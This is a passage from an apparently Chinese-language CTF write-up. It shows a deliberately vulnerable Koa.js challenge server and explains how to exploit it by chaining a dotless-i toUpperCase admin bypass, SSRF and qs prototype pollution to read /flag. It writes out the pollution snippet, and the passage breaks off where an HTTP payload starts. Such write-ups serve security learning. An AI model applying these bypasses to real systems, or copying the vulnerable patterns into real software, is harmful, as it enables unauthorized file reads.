&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;403: You are not the local user&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">switch&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">reqbody&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">qs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">querystring&lt;/span>&lt;span style="color:#111">,{&lt;/span>&lt;span style="color:#75af00">allowPrototypes&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">switch&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">spath&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#75af00">paths&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readdirSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">buffer&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;opath&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/[flag]/&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;opath&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#75af00">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;opath&amp;#39;&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/f|l|a|g/g&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">paths&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#75af00">paths&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">buffer&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFileSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">WriteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">spath&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">text&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/delete&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;ADMIN&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;/results.txt&amp;#39;&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#75af00">DeleteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Delete the results Successfully!&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Nothing to delete!&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userName&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">checkUser&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userName&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toUpperCase&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">isAdmin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,{&lt;/span>
&lt;span style="color:#75af00">list&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">isAdmin&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">isAdmin&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Privilege&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Staff&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;ADMIN&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Privilege&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Monitor&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">isAdmin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;tmp/&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mkdirSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,{&lt;/span>
&lt;span style="color:#75af00">list&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">isAdmin&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">isAdmin&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">keys&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;hpdoger&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">paths&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#75715e">//depend on remote server,not real
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">views&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./views&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">extension&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;ejs&amp;#39;&lt;/span>
&lt;span style="color:#111">}))&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./static&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./tmp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bodyParser&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">CONFIG&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#111">()).&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">allowedMethods&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[demo] start-quick is starting at port 3000&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>唔，看起来要比其它的复杂不少，但是核心漏洞点是一样的；简单审一下代码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206230457270.png" alt="image-20211206230457270">&lt;/p>
&lt;p>只允许admin用户才可以加载其它的模板&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206230620584.png" alt="image-20211206230620584">&lt;/p>
&lt;p>确实是&lt;code>toUpperCase()&lt;/code>的问题，很轻松就用&lt;code>admın&lt;/code>绕过了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206231746702.png" alt="image-20211206231746702">&lt;/p>
&lt;p>/request路由下的请求经过&lt;code>CheckUrl&lt;/code>的检查&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206231939254.png" alt="image-20211206231939254">&lt;/p>
&lt;p>必须开头是http://127.0.0.1:3000/query，没法绕过，需要SSRF；请求之后会被记录在sandbox的results.txt里面（追加的形式），sandbox根据ip建立&lt;/p>
&lt;p>而恰好/query本身也是一个路由&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206232301967.png" alt="image-20211206232301967">&lt;/p>
&lt;p>并且参数param比较好绕过，我们借助它来完成我们的攻击；接下来找利用点，看到/save路由&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206234720831.png" alt="image-20211206234720831">&lt;/p>
&lt;p>简单的分析写在注释中了，138行用ssrf绕过，146行使用的qs库有&lt;a href="https://security.snyk.io/vuln/npm:qs:20170213">原型链污染&lt;/a>的问题，传参&lt;code>]=switch&lt;/code>即可绕过；154行的判断也需要绕过，原型链污染sandbox下的一个文件为&lt;code>/flag&lt;/code>，再去自定义读到spath中&lt;/p>
&lt;pre tabindex="0">&lt;code>tmp['__proto__']['opath'] = '/flag';
=&amp;gt;
paths.opath = /flag
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#960050;background-color:#1e0010">amiz HTTP/1.1
